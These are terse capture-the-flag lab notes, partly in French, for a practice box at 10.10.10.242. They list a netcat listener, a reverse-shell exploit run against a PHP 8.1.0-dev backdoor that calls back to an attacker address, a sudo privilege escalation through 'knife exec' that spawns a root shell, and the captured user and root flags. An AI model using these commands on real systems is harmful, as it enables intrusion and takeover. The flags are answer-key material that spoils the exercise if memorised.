#ip box : 10.10.10.242

#exploit PHP 8.1.0-dev 

#commmande shell reverse shell interactif :

nc -nlvp 4444
python3 revshell_php_8.1.0-dev.py "http://10.10.10.242/" "10.10.14.11" "4444"

#user flag : c41bd89607db2540cd9a4789b978095b
 
 passer root :

 sudo -l 

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife

 sudo /usr/bin/knife exec --exec 'exec "/bin/bash";'
 
ou bien passer en script en ruby ds un fichier puis l'executer
 
 flag root :
 a07f349ab05cbe75e3d10b2ac8fdc52f